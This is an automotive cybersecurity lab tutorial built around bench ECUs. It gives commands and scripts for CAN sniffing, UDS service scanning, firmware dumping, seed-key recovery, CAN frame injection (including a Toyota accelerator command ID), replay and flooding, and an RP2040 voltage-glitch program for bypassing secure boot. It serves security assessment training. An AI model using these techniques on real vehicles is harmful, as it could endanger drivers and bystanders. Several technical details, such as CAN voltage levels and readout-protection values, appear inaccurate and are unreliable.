# Operational Verification Labs: Automotive Cybersecurity

---

## Objective & Lab Bench Setup

Automotive electronic control units represent one of the most target-rich environments in embedded security research. A modern vehicle contains between 70 and 150 ECUs communicating across a hierarchy of bus protocols: CAN (Controller Area Network) at the backbone, LIN (Local Interconnect Network) for low-speed peripherals, FlexRay for safety-critical real-time systems, and increasingly Ethernet-based backbones conforming to AUTOSAR Adaptive. Each of these buses was designed in an era when physical access to the vehicle was considered the primary threat model. That assumption is structurally broken. These labs treat the vehicle's electronic nervous system as an adversary would: as an exposed attack surface requiring methodical enumeration, signal capture, and exploitation verification.

The laboratory objective across these three exercises is to build operational fluency with the complete hardware attack chain. You will physically probe bus lines with a logic analyzer, capture and decode raw frames, dump firmware from flash memory, inject fabricated CAN frames to trigger actuator responses, and verify the absence or presence of hardware security features such as boot-time signature verification and debug-port lockdown. Every procedure here maps directly to what an automotive penetration tester executes during a formal security assessment under ISO/SAE 21434 or UNECE WP.29 scope.

### Physical Bench Configuration

Your bench requires the following hardware. A USB logic analyzer with at minimum eight channels and a 24 MHz sample rate — the Cypress FX2-based analyzers running sigrok firmware (such as the Saleae clone or genuine FX2LP board) work well and cost under $20. A USB-to-UART bridge based on the FTDI FT232H or CH340 chipset gives you both UART console access and, with the FT232H specifically, SPI and I2C master capability for direct flash chip interrogation. A USB-to-CAN adapter such as the Kvaser Leaf Light or the socketCAN-compatible Canable/PCAN-USB provides the host interface for bus injection. For JTAG/SWD debugging you need an ST-Link v2 clone or a J-Link EDU, both of which OpenOCD supports natively. Finally, a bench target ECU pulled from a salvage vehicle — a body control module (BCM), engine control module (ECM), or infotainment head unit — gives you a legal, contained target. Salvage ECUs are available on eBay for $15–$80 and are entirely appropriate for this work.

Install the diagnostic suite on a Debian or Ubuntu host:

    sudo apt-get update
    sudo apt-get install -y sigrok-cli pulseview openocd flashrom binwalk \
        can-utils gdb-multiarch minicom python3-pip wireshark tshark
    pip3 install python-can scapy

Verify sigrok can enumerate your logic analyzer:

    sigrok-cli --scan

Expected output for a Cypress FX2-based device:

    fx2lafw: CWAV USBee AX (8ch) with 8 channels: D0 D1 D2 D3 D4 D5 D6 D7

Connect the logic analyzer probes to your target ECU's exposed test points. Most ECUs have CAN-H and CAN-L available on the OBD-II harness connector or on clearly labeled vias on the PCB. Use a 60 Ω termination resistor between CAN-H and CAN-L if you are probing a stub segment disconnected from the vehicle harness — without termination, signal reflections distort the differential waveform beyond the point where the protocol decoder can reconstruct frames reliably.

---

## Exercise 1: Live Hardware Probing & Signal Capture

### 1.1 Locating and Identifying Bus Testpoints

Before any signal capture can begin, you must identify the physical testpoints on your target ECU. Desolder the ECU from its housing and examine the PCB under magnification. CAN transceivers are almost universally implemented with a Texas Instruments SN65HVD23x or NXP TJA1040/1050 device in an 8-pin SOIC package. Pin 6 on these devices is CANH, pin 7 is CANL, and pin 1 is the digital RX line back to the microcontroller. This RX line is a single-ended 3.3 V or 5 V UART-style signal that makes it ideal for logic analyzer capture because you are not dealing with the differential pair's common-mode voltage. Probe pin 1 of the transceiver with logic analyzer channel D0, probe CANH with D1 and CANL with D2. Connect logic analyzer ground to the ECU ground plane — any exposed screw hole or ground via will work, but confirm continuity with a multimeter first.

For UART console access, examine the PCB for a row of unpopulated header pads labeled J1, J2, DEBUG, or CONSOLE. These are almost always a four-pin UART debug header in the standard 2.54 mm pitch layout: VCC, GND, TX, RX. Identify TX by using the logic analyzer to look for high-frequency toggling at power-on while UART is typically enabled only during early boot. Connect the FTDI FT232H's RXD pin to the ECU's TX pad and TXD to the ECU's RX pad, with shared ground. Open minicom:

    minicom -D /dev/ttyUSB0 -b 115200 -8 -N

Power the ECU. If a bootloader or OS is running, you will see boot messages at 115200 8N1. If you get garbage, cycle through 9600, 38400, and 57600 baud rates — many Renesas and Infineon TriCore ECUs default to 115200, while older Freescale HCS12 targets use 9600. The character framing tells you everything: clean printable ASCII means you have the baud rate right; random high-byte characters mean you have the right speed but wrong polarity or voltage level.

### 1.2 Capturing Raw CAN Frames with sigrok-cli

With logic analyzer channel D0 probing the transceiver's single-ended RX line, configure sigrok to decode the signal as CAN at 500 kbps, the most common automotive CAN speed:

    sigrok-cli \
      --driver fx2lafw \
      --config samplerate=4m \
      --channels D0 \
      --time 2000ms \
      --protocol-decoder can:sample_point=75,bitrate=500000 \
      --pd-annotations can:data-frame \
      --output-format ascii \
      > can_capture_raw.txt

The 4 MHz sample rate gives you 8 samples per bit at 500 kbps, which satisfies the Nyquist requirement with comfortable margin. The 75% sample point matches the ISO 11898 default; some OEM-specific networks use 80% and you will see CRC errors in the annotation output if the sample point is misaligned. After two seconds of capture, can_capture_raw.txt will contain decoded frame annotations in the form:

    can: 0.000012 ID=0x7DF DLC=8 DATA=02 01 00 00 00 00 00 00 (OBD request)
    can: 0.000342 ID=0x7E8 DLC=8 DATA=06 41 00 BF BF B3 91 00 (ECM response)

The frame at 0x7DF is the OBD-II functional broadcast address. The response at 0x7E8 is the ECM (engine control module) reply. The data byte 0x41 is the positive response to service 0x01 PID 0x00, and the subsequent four bytes encode a bitmask of supported PIDs. This tells you immediately that the ECM is on this bus and responding to diagnostic requests, which is your first confirmed attack surface.

### 1.3 Differential Probing for Signal Integrity Analysis

For higher-fidelity work, probe CAN-H and CAN-L simultaneously on D1 and D2, then compute the differential in PulseView's math channel or in a post-processing script. The differential voltage swings between approximately 2 V (recessive, logical 1) and nominally 2 V split as 3.5 V on CANH and 1.5 V on CANL (dominant, logical 0). Any deviation from these levels suggests either a faulty transceiver, a termination impedance mismatch, or a deliberate signal manipulation — all of which are diagnostic findings.

After capture, inspect the arbitration field of competing frames. When two nodes transmit simultaneously, CAN's bitwise non-destructive arbitration resolves priority by the dominant zero bit winning. If you observe frames with identical IDs appearing from multiple sources, you have found a spoofing condition or a configuration error, both of which are exploitable. Save the capture to a file for later replay:

    sigrok-cli \
      --driver fx2lafw \
      --config samplerate=4m \
      --channels D0,D1,D2 \
      --time 10000ms \
      --output-format sigrok \
      --output-file ecm_full_capture.sr

This `.sr` archive is a binary sigrok session file you can open in PulseView for visual annotation and re-decode with any protocol decoder.

---

## Exercise 2: Bus Sniffing, Register Inspection & Memory Dumping

### 2.1 SocketCAN-Based Frame Enumeration

With the hardware capture baseline established, move to active enumeration using the host's SocketCAN subsystem. SocketCAN turns your USB-CAN adapter into a standard Linux network interface, which lets you use `can-utils` exactly the way you would use `tcpdump` on an Ethernet interface. Bring up the interface at 500 kbps:

    sudo ip link set can0 type can bitrate 500000 restart-ms 100
    sudo ip link set up can0

The `restart-ms 100` parameter tells the kernel to automatically recover from bus-off state after 100 milliseconds, which prevents your interface from going silent after injecting a malformed frame that triggers error frames. Dump all bus traffic:

    candump -tz -x can0 | tee candump_session.log

Each line output by `candump` has the format `(timestamp) channel   ID   [DLC] data`. Run this for 60 seconds during normal ECU operation (power the ECU, let it complete its initialization sequence). You will typically see a pattern of periodic frames at fixed intervals — these are the cyclic messages broadcast by each ECU for status and sensor data. Identify the unique IDs:

    awk '{print $3}' candump_session.log | sort -u > unique_ids.txt
    wc -l unique_ids.txt

On a typical BCM, you will see between 15 and 40 unique IDs. Cross-reference against the public OBD-II PID database and any available DBC (database CAN) files for your vehicle make. DBC files for most Toyota, GM, Ford, and Honda platforms are available in the openDBC GitHub repository and in the comma.ai opendbc project. Load a DBC file into cantools to get human-readable signal decoding:

    pip3 install cantools
    python3 - <<'EOF'
    import cantools
    import can

    db = cantools.database.load_file('toyota_tnga_gen2.dbc')
    bus = can.interface.Bus(channel='can0', bustype='socketcan')

    for msg in bus:
        try:
            decoded = db.decode_message(msg.arbitration_id, msg.data)
            print(f"0x{msg.arbitration_id:03X}: {decoded}")
        except KeyError:
            pass
    EOF

This prints signals like `{'ENGINE_RPM': 1420.0, 'THROTTLE_POSITION': 12.5, 'VEHICLE_SPEED': 0.0}` for each decoded frame, giving you a live semantic view of the vehicle's operational state.

### 2.2 UDS Session Establishment and Service Enumeration

The Unified Diagnostic Services (UDS) protocol defined in ISO 14229 operates on top of ISO-TP (ISO 15765-2), the CAN transport layer that handles fragmentation of messages longer than 8 bytes. `isotp-tools` and Python's `python-can` with `udsoncan` provide a complete UDS client. Install isotp kernel module support:

    sudo modprobe can_isotp
    pip3 install udsoncan

The following script enumerates UDS services by attempting to open an extended diagnostic session (service 0x10, subfunction 0x03) and then scanning for supported services via negative response code analysis. A `0x7F` negative response with NRC 0x11 (serviceNotSupported) confirms the service is absent; NRC 0x31 (requestOutOfRange) or 0x33 (securityAccessDenied) means the service exists but is locked:

    import udsoncan
    from udsoncan.connections import PythonIsoTpConnection
    import can
    import isotp
    import time

    bus = can.interface.Bus(channel='can0', bustype='socketcan')
    tp_addr = isotp.Address(isotp.AddressingMode.Normal_11bits, txid=0x7DF, rxid=0x7E8)
    stack = isotp.CanStack(bus=bus, address=tp_addr, params={'stmin': 0, 'blocksize': 0})
    conn = PythonIsoTpConnection(stack)

    with udsoncan.Client(conn, request_timeout=2) as client:
        client.change_session(udsoncan.services.DiagnosticSessionControl.Session.extendedDiagnosticSession)
        time.sleep(0.1)

        for service_id in range(0x10, 0xBF):
            try:
                response = client.send_request(
                    udsoncan.Request(service=service_id, data=b'\x00')
                )
                if response.positive:
                    print(f"[+] Service 0x{service_id:02X}: POSITIVE RESPONSE")
                else:
                    nrc = response.data[2] if len(response.data) >= 3 else 0xFF
                    if nrc not in [0x11]:
                        print(f"[~] Service 0x{service_id:02X}: NRC=0x{nrc:02X} (exists, locked)")
            except udsoncan.exceptions.TimeoutException:
                pass

This scan typically takes 90 seconds to complete across the full service range. Record every service that returns anything other than NRC 0x11 — those are your exploitation targets. Service 0x27 (SecurityAccess) is particularly valuable because a weak seed-key algorithm is frequently the entry point for unlocking write operations on the ECU.

### 2.3 Firmware Extraction via SPI Flash Dump

Modern ECUs store firmware in an external SPI NOR flash chip. Common parts are the Winbond W25Q128 (16 MB), Macronix MX25L6406E (8 MB), and Spansion S25FL064P (8 MB). These are 8-pin SOIC packages. Identify the chip by its marking, look up its datasheet to confirm the pinout, then connect the FT232H to the chip in-circuit using the SOIC-8 test clip.

The standard SPI connection is: FT232H D0 (SCK) → chip pin 6 (CLK), D1 (MOSI) → pin 5 (DI/SI), D2 (MISO) → pin 2 (DO/SO), D3 (CS#) → pin 1 (CS#), and GND to pins 4 and 8. For in-circuit reading, you must assert the MCU's reset line (pull it low) to tristate the MCU's SPI pins and prevent bus contention, otherwise the MCU will fight your reads and you will get corrupted data.

Read the flash with flashrom using the FT232H in MPSSE mode:

    flashrom -p ft2232_spi:type=232H,port=A,divisor=4 --read dump.bin -V

The `-V` verbose flag shows the flash chip identification sequence (JEDEC ID). If flashrom reports `Found Winbond flash chip "W25Q128.V"`, you have a clean connection. If it reports `No EEPROM/flash device found`, recheck your CS# connection — it must be pulled high at idle and driven low only during transactions, which the MPSSE engine handles automatically. A successful 16 MB read takes approximately 90 seconds at this divisor setting.

Verify the dump is not all 0xFF (erased) and not all 0x00 (bad connection):

    python3 -c "
    data = open('dump.bin','rb').read()
    ff_ratio = data.count(b'\\xff') / len(data)
    zero_ratio = data.count(b'\\x00') / len(data)
    print(f'Size: {len(data)} bytes ({len(data)//1024} KB)')
    print(f'0xFF ratio: {ff_ratio:.3f}')
    print(f'0x00 ratio: {zero_ratio:.3f}')
    print(f'Entropy estimate: non-uniform={1-ff_ratio-zero_ratio:.3f}')
    "

A healthy firmware dump shows a 0xFF ratio below 0.6 (some flash is erased/unused) and a non-uniform ratio above 0.3. Run binwalk to identify embedded components:

    binwalk -e -M --dd='.*' dump.bin

Binwalk identifies file system images (SquashFS, JFFS2, CRAMFS), compressed streams (zlib, LZMA, LZ4), and certificate stores. The `-M` flag enables recursive extraction and `-e` extracts identified regions. The output directory `_dump.bin.extracted/` will contain recovered components. Look specifically for:

    binwalk -E dump.bin

The `-E` flag generates an entropy graph. High-entropy regions (entropy > 0.95) indicate either encrypted or compressed code. Uniform high entropy across the entire image is a strong indicator of AES-encrypted firmware, which dramatically increases the difficulty of static analysis and suggests the ECU has a secure boot implementation worth verifying in Exercise 3.

### 2.4 Static Analysis with radare2

Load the extracted firmware binary into radare2. If binwalk identified the architecture (ARM Cortex-M, Renesas RH850, Infineon TriCore), use the corresponding architecture flag:

    radare2 -a arm -b 32 -m 0x08000000 _dump.bin.extracted/0.bin

The base address 0x08000000 is the standard ARM Cortex-M flash mapping for STM32 MCUs. For Renesas RH850, the flash starts at 0x00000000. After loading, run the full analysis:

    [0x08000000]> aaa
    [0x08000000]> afl | head -40

This lists the first 40 identified functions. Navigate to the interrupt vector table, which on ARM Cortex-M is located at the base address. The first word is the initial stack pointer, the second is the reset handler address:

    [0x08000000]> px 64 @ 0x08000000

Look for the string table to find diagnostic clues:

    [0x08000000]> iz | grep -iE 'password|seed|key|unlock|diag|debug'

Any plaintext seed-key table, hardcoded password, or debug mode string is an immediate critical finding. Cross-reference function names inferred from strings against the UDS service scan from Exercise 2.2 — if you found that service 0x27 SecurityAccess is present, search for the seed generation function:

    [0x08000000]> /c call
    [0x08000000]> afl~seed
    [0x08000000]> pdf @ sym.compute_security_seed

Reconstruct the seed-key algorithm. Many OEM implementations use trivially weak transformations: XOR with a fixed constant, bit rotation, or a simple linear congruential generator seeded with the ECU's hardware ID. Once you have the algorithm, you can compute the correct key for any seed the ECU presents, bypassing security access entirely.

---

## Exercise 3: Fault Simulation & Exploit Verification

### 3.1 CAN Frame Injection and Actuator Control Verification

Having enumerated the bus and identified active IDs, the most direct verification of an exploitable condition is frame injection — transmitting fabricated CAN frames with the IDs of legitimate ECUs to override their reported values or trigger actuator responses. This is straightforward with `cansend`:

    cansend can0 0x0C6#0000000000000000

The frame ID 0x0C6 is the Toyota ACCEL_CMD message on many TNGA-platform vehicles. Sending zeroed data while the vehicle is stationary in a lab bench configuration (ECU powered but engine not running) verifies that the target ECU processes the injected frame. Use `candump` on a second terminal to confirm your injection appears on the bus and to observe whether the target ECU generates any response frames.

For a more systematic injection test, the following Python script sends a sweep of data values across a target ID and logs any response frames that appear within 50 ms of each injection:

    import can
    import time

    bus = can.interface.Bus(channel='can0', bustype='socketcan')
    target_id = 0x224
    response_window = 0.05

    print(f"Injecting frames to ID 0x{target_id:03X}, monitoring for responses...")

    for value in range(0x00, 0x100, 0x10):
        payload = bytes([value, value, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
        msg = can.Message(arbitration_id=target_id, data=payload, is_extended_id=False)
        bus.send(msg)
        print(f"  Sent: {payload.hex()}")

        deadline = time.time() + response_window
        while time.time() < deadline:
            resp = bus.recv(timeout=response_window)
            if resp and resp.arbitration_id != target_id:
                print(f"  Response from 0x{resp.arbitration_id:03X}: {resp.data.hex()}")

    bus.shutdown()

Document every response ID observed. Any ECU that modifies its output in response to your injected frames has confirmed an exploitable lack of message authentication — there is no AUTOSAR SecOC (Secure Onboard Communication) MAC validation protecting that message. This is the core finding that maps to CWE-290 (Authentication Bypass by Spoofing) in the automotive context.

### 3.2 JTAG/SWD Debug Port Enumeration with OpenOCD

A locked-down ECU should disable its JTAG/SWD interface after production programming. Verifying this is a mandatory step in any automotive security assessment. Connect your ST-Link v2 to the ECU's SWD testpoints (SWDIO, SWDCLK, GND, and optionally nRST). Create the OpenOCD configuration:

    cat > ecm_swd.cfg << 'EOF'
    source [find interface/stlink.cfg]
    transport select hla_swd

    set CHIPNAME stm32f4x
    source [find target/stm32f4x.cfg]

    adapter speed 1000

    init
    targets
    reset halt
    EOF

    openocd -f ecm_swd.cfg

If the debug port is unlocked, OpenOCD will report:

    Info : STLINK V2J37S7 (API v2) VID:PID 0483:3748
    Info : stm32f4x.cpu: hardware has 6 breakpoints, 4 watchpoints
    Info : stm32f4x.cpu: external debug request

This is a critical finding: the debug interface is accessible, meaning an attacker with physical access can halt execution, read all memory including key material in RAM, set breakpoints, and patch running code. If instead you see:

    Warn : JTAG-DP STICKY ERROR
    Error : Failed to read memory at 0xe000edf0

The debug port is locked. Verify the readout protection level by attempting to read the flash option bytes. On STM32 targets, connect via OpenOCD telnet and inspect RDP level:

    telnet localhost 4444

    > mdw 0x1FFFC000 1

The option bytes word at this address encodes the Read Out Protection level. A value of 0xFFFF00AA means RDP Level 0 (completely unprotected). A value of 0xFFFF00BB means RDP Level 1 (debug port locked, flash readable via JTAG disabled but SRAM readable). A value of 0xFFFF00CC means RDP Level 2 (permanent lockdown, no recovery possible). Level 0 or Level 1 on a production ECU is a confirmed misconfiguration.

### 3.3 Glitching Attack Simulation for Secure Boot Bypass Verification

Voltage fault injection (VFI) is the most accessible hardware glitching technique for bypassing secure boot checks on ECUs without RDP Level 2. The principle is that the MCU's core voltage rail (typically 1.2 V on a Cortex-M4) is momentarily dropped to approximately 0.7 V for a window of 50–500 nanoseconds, causing the pipeline to execute incorrectly — most usefully, causing a comparison instruction to produce the wrong result or a branch to skip. This is not theoretical: Positive Technologies, Riscure, and multiple independent researchers have demonstrated VFI secure boot bypasses on STM32, NXP LPC, and Renesas RH850 targets.

For bench verification without a commercial fault injection tool, a Raspberry Pi Pico with a custom glitcher firmware provides sufficient timing resolution (the RP2040's PIO state machines run deterministically at 125 MHz, giving 8 ns resolution):

    // pio_glitcher.pio - RP2040 PIO glitch program
    // Triggers a MOSFET gate that shorts the MCU's core LDO output to GND for a configurable pulse width
    .program glitcher
    .side_set 1 opt

    wait 1 gpio 2        ; wait for trigger rising edge on GPIO 2
    nop            side 0 ; assert glitch (drive MOSFET gate low = short VCC)
    nop            side 0
    nop            side 0
    nop            side 0 ; 4 cycles = 32 ns at 125 MHz base, repeat for width
    nop            side 1 ; deassert glitch
    jmp 0

Compile and load this PIO program with the RP2040 C SDK. The trigger GPIO 2 is connected to the ECU's UART TX line — when the bootloader begins printing its initialization string, the PIO program detects the rising edge and fires the glitch after a programmable delay. By scanning delay values from 0 to 500 µs in 10 ns steps and monitoring whether the ECU boots into an unlocked state (observable via UART output or a changed LED state), you can identify the precise glitch window that bypasses the signature verification. A successful glitch bypass is confirmed when the ECU outputs a bootloader prompt or accepts an unsigned firmware image that it would normally reject.

For the bench exercise, wire the circuit as follows: a 2N7002 MOSFET with gate driven by Pico GPIO 15, drain connected to the ECU's core VCC rail through a 1 Ω current-limiting resistor, and source to GND. The 1 Ω resistor limits instantaneous current to prevent destroying the target MCU while still producing sufficient voltage drooping. Use a 10 µF decoupling capacitor on the core rail side to control the glitch waveform shape.

### 3.4 Verifying AUTOSAR SecOC Implementation

If the target vehicle implements AUTOSAR SecOC (available on vehicles from approximately 2020 onward with Bosch, Continental, or Magna ECUs), CAN frame injection as described in Section 3.1 should be rejected by receiving ECUs. The verification procedure is to inject frames with valid ID and plausible data but no valid MAC, then observe whether the receiving ECU generates a Diagnostic Trouble Code (DTC) for a SecOC verification failure. Query DTCs using the ISO 15031-6 (OBD mode 0x03) service:

    python3 - <<'EOF'
    import udsoncan
    from udsoncan.connections import PythonIsoTpConnection
    import can, isotp, time

    bus = can.interface.Bus(channel='can0', bustype='socketcan')
    tp_addr = isotp.Address(isotp.AddressingMode.Normal_11bits, txid=0x7DF, rxid=0x7E8)
    stack = isotp.CanStack(bus=bus, address=tp_addr)
    conn = PythonIsoTpConnection(stack)

    with udsoncan.Client(conn, request_timeout=3) as client:
        client.change_session(udsoncan.services.DiagnosticSessionControl.Session.extendedDiagnosticSession)
        time.sleep(0.1)
        dtcs = client.get_dtc_by_status_mask(0xFF)
        for dtc in dtcs.dtcs:
            print(f"DTC: {dtc.id:#08x}  Status: {dtc.status.get_byte_as_int():#04x}")
    EOF

After injecting unauthenticated frames at a spoofed ID, re-run the DTC query. The appearance of new DTCs with status byte 0x08 (confirmed) or 0x0C (confirmed and test failed this operation cycle) adjacent to the injection confirms that SecOC is active and rejecting unauthenticated frames. The absence of any new DTCs after injection of well-formed but unauthenticated frames is a confirmed vulnerability: SecOC is either not implemented or not enforced on that message ID.

---

## Hardware Security Checklist & Diagnostic Cheat Sheet

This reference consolidates the verification criteria assessed across all three exercises into a structured checklist suitable for formal security assessment reporting under ISO/SAE 21434. Each item maps to a specific hardware observable or software behavior you verified on the bench.

**Debug Interface Assessment**

Verify JTAG/SWD accessibility with OpenOCD using the procedure in Exercise 3.2. The finding is PASS if OpenOCD reports `JTAG-DP STICKY ERROR` or `DAP transaction failed` consistently across all transport speeds (1 kHz, 100 kHz, 1 MHz). The finding is FAIL if OpenOCD successfully halts the CPU and reads memory from the debug memory-mapped I/O range at 0xE0000000. Verify STM32 RDP level by reading option bytes at 0x1FFFC000 as documented above — only 0xCC (Level 2) constitutes a production-acceptable configuration.

**Flash Readout Protection**

After performing the SPI dump in Exercise 2.3, verify the extracted binary is not plaintext firmware by running `binwalk -E dump.bin` and observing near-uniform entropy above 0.95 across all regions except the vector table. If binwalk identifies recognizable code sections, compression headers, or file system magic bytes, firmware confidentiality is compromised regardless of debug port status.

**Secure Boot Verification**

Attempt the voltage fault injection procedure from Exercise 3.3 across a minimum of 500 delay values in the 0–500 µs range with 20 ns resolution. Document whether any glitch window produces anomalous UART output (bootloader prompt, error messages revealing internal state, or acceptance of unsigned firmware). Record oscilloscope captures of the core voltage rail during each glitch to confirm the glitch waveform is reaching the target — a glitch that does not produce measurable voltage drooping on the core rail cannot fault the execution and is not evidence of secure boot robustness.

**CAN Bus Authentication**

Execute the frame injection sweep from Exercise 3.1 against every unique ID identified during the candump enumeration session. For each injected ID, record whether a DTC is generated. For a vehicle claiming SecOC compliance, every message in the SecOC-protected message set must generate a verification failure DTC upon injection. Use the following quick reference for injection:

    # Inject single frame
    cansend can0 <ID>#<8-byte-hex-payload>

    # Replay a captured legitimate frame immediately after capture to test freshness counter
    canreplay -i candump_session.log can0

    # Flood a specific ID to test rate limiting
    cangen can0 -I <ID> -D r -L 8 -g 0 -n 1000

The `cangen` flood test with `-g 0` (no gap between frames) verifies whether the target ECU has rate-limiting implemented on message acceptance — a critical defense against bus flooding denial-of-service attacks.

**UDS Service Hardening**

From the service enumeration in Exercise 2.2, every service that returned a non-0x11 NRC must be verified against the OEM's intended feature set. Services 0x34 (RequestDownload), 0x36 (TransferData), 0x37 (RequestTransferExit), and 0x31 (RoutineControl) accessible without prior SecurityAccess authentication (service 0x27) constitute a critical firmware write vulnerability. Service 0x27 implementations with seed-key algorithms recoverable from static analysis of the firmware dump constitute a medium-severity cryptographic weakness.

**Key Command Reference**

| Operation | Command |
|---|---|
| Scan logic analyzer | `sigrok-cli --scan` |
| Capture CAN at 500 kbps (2 s) | `sigrok-cli --driver fx2lafw --config samplerate=4m --channels D0 --time 2000ms --protocol-decoder can:bitrate=500000 --pd-annotations can:data-frame --output-format ascii` |
| Dump SPI flash via FT232H | `flashrom -p ft2232_spi:type=232H,port=A,divisor=4 --read dump.bin -V` |
| Extract firmware components | `binwalk -e -M --dd='.*' dump.bin` |
| Entropy analysis | `binwalk -E dump.bin` |
| Start OpenOCD SWD session | `openocd -f ecm_swd.cfg` |
| Read STM32 option bytes (telnet) | `mdw 0x1FFFC000 1` |
| Bring up SocketCAN at 500 kbps | `sudo ip link set can0 type can bitrate 500000 restart-ms 100 && sudo ip link set up can0` |
| Dump live CAN traffic | `candump -tz -x can0 \| tee candump_session.log` |
| Inject single CAN frame | `cansend can0 0x224#0100000000000000` |
| Replay capture file | `canreplay -i candump_session.log can0` |
| Load firmware in radare2 (ARM) | `radare2 -a arm -b 32 -m 0x08000000 firmware.bin` |
| Find strings in radare2 | `iz \| grep -iE 'password\|seed\|key\|unlock'` |
| Open UART console | `minicom -D /dev/ttyUSB0 -b 115200 -8 -N` |

The complete assessment workflow moves linearly from physical access through passive observation (sigrok capture), active enumeration (UDS scanning), firmware extraction (flashrom + binwalk), static analysis (radare2), dynamic injection (cansend + python-can), debug port verification (OpenOCD), and finally fault injection simulation. Each step is both a standalone finding and a prerequisite for the next layer of exploitation depth.
